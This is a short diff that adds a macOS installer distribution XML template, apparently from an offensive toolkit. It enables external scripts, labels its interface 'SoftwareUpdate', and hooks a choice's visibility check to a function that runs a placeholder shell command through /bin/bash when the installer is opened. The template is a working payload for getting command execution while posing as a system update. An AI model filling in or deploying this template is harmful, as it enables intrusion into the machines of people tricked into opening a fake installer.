@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<installer-gui-script minSpecVersion='1'>
+<options allow-external-scripts = "yes"/>
+<choices-outline ui='SoftwareUpdate'>
+<line choice='su'/>
+</choices-outline>
+<choice id='su' visible ='<%FNAME%>()'/>
+
+<script>function <%FNAME%>() { system.run('/bin/bash', '-c', "<%CMD%>"); }</script>
+</installer-gui-script>
